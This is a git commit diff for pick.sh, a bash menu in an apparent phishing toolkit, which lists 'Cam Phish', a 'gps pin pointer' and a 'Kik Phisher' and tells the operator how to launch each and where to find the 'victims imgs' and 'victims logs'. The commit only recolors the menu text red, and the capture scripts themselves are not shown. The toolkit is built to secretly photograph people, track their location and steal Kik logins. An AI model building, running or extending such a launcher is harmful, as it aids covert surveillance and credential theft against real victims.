579633e33021e85e743fd90f20a0168da5b95bf2
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2024-08-08 22:16:56 -0500

    Update pick.sh

--- tools/phishers/pick.sh
+++ tools/phishers/pick.sh
@@ -1,45 +1,48 @@
 #!/bin/bash
 
+# ANSI escape codes for red text
+RED='\033[0;31m'
+NC='\033[0m'  # No color
+
 # Clear the terminal
 clear
 
 # Display menu options
-echo "1. Cam Phish"
-echo "2. gps pin pointer"
-echo "0. Exit"
+echo -e "${RED}1. Cam Phish${NC}"
+echo -e "${RED}2. gps pin pointer${NC}"
+echo -e "${RED}0. Exit${NC}"
 
 # Read user input
-read -p "Choose an option: " choice
+read -p "$(echo -e ${RED}Choose an option: ${NC})" choice
 
 # Handle user input
 case $choice in
     1)
         # Display a message and wait for user to press Enter
-        echo "Start camphisher by saying cd tools/phishers and then bash camphish.sh"
-        echo "Find the victims imgs in cd tools/phishers/imgs"
-        read -p "Press [Enter] to return to the menu or exit..."
+        echo -e "${RED}Start camphisher by saying cd tools/phishers and then bash camphish.sh${NC}"
+        echo -e "${RED}Find the victims imgs in cd tools/phishers/imgs${NC}"
+        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     2)
         # Display a message and wait for user to press Enter
-        echo "Start gps pin pointer by saying cd tools/phishers and then bash gps.sh"
-        echo "Find the victims logs in cd tools/phishers/ and then open logs.txt"
-        read -p "Press [Enter] to return to the menu or exit..."
+        echo -e "${RED}Start gps pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
+        echo -e "${RED}Find the victims logs in cd tools/phishers/ and then open logs.txt${NC}"
+        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
-
     3)
         # Display a message and wait for user to press Enter
-        echo "Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh"
-        echo "Find the victims logs in cd tools/phishers/ and then open saved.txt"
-        read -p "Press [Enter] to return to the menu or exit..."
+        echo -e "${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
+        echo -e "${RED}Find the victims logs in cd tools/phishers/ and then open saved.txt${NC}"
+        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     0)
         # Exit the script
-        echo "Exiting..."
+        echo -e "${RED}Exiting...${NC}"
         exit 0
         ;;
     *)
         # Invalid choice
-        echo "Invalid choice, please enter 1 or 0."
+        echo -e "${RED}Invalid choice, please enter 1 or 0.${NC}"
         ;;
 esac
 
